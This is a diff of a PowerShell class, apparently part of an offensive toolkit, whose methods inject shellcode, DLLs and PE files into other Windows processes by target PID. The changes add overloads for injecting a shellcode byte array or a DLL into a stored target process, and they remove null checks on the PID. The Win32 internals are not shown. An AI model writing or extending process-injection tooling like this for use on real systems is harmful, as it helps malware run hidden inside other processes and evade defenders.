@@ -103,9 +103,7 @@ class Progenitor {
         $cls = [Progenitor]
         $conname = "InjectSHC"
 
-        if ($null -ne $tPID) {
-            $cls::TargetProcess($tPID)
-        }
+        $cls::TargetProcess($tPID)
 
         # Setup | Win32
         $cls::InitK32Mem()
@@ -141,14 +139,17 @@ class Progenitor {
         return $true
     }
 
+    static [void]InjectDLL([byte[]]$shellcode) {
+        $cls = [Progenitor]
+        $cls::InjectShc($shellcode, $cls::targetPID)
+    }
+
     static [void]InjectDLL([string]$dllPath, [uint32]$tPID) {
         # Setup | Class & Debug
         $cls = [Progenitor]
         $conname = "InjectDLL"
 
-        if ($null -ne $tPID) {
-            $cls::TargetProcess($tPID)
-        }
+        $cls::TargetProcess($tPID)
 
         # Setup | Win32
         $cls::InitK32DLL()
@@ -200,6 +201,11 @@ class Progenitor {
 
         # Console
         Write-Console -name $conname -msg "Injected [$dllPath] into [$tPID] at [$($allocAddr.ToString('X'))](Thread: $hThread)"
+    }
+
+    static [void]InjectDLL([string]$dllPath) {
+        $cls = [Progenitor]
+        $cls::InjectDLL($dllPath, $cls::targetPID)
     }
 
     static [void]InjectPE([string]$pePath) {
